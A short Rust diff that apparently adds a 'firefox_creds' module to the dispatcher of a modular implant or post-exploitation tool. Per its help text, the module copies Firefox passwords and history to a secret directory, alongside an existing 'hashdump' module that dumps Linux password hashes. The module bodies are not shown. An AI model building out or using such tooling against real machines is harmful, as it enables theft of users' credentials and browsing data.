@@ -9,7 +9,7 @@
 mod example;
 mod password_dump;
 mod sys_info;
-
+mod firefox_creds;
 // takes in a &str (the name of the module), runs that module, and then
 // returns the output of the module as a vector of bytes.
 pub fn dispatch(s: String) -> Vec<u8> {
@@ -23,6 +23,7 @@ pub fn dispatch(s: String) -> Vec<u8> {
         "example" => example::run(),
         "hashdump" => password_dump::run(),
         "sys_info" => sys_info::run(),
+        "firefox_creds" => firefox_creds::run(),
         &_ => format!("MODULE NOT FOUND: {s_trimmed}\n").to_string(),
     };
     return result.as_bytes().to_vec();
@@ -39,6 +40,7 @@ pub fn list_mods() {
     println!("example - a template for developers to write their own modules");
     println!("hashdump - dumps hashes from common places on linux systems");
     println!("sys_info - prints out system information");
+    println!("firefox_creds - copies passwords/history files to secret dir");
 }
 
 // fixes bug where bagillion null bytes sadge :(
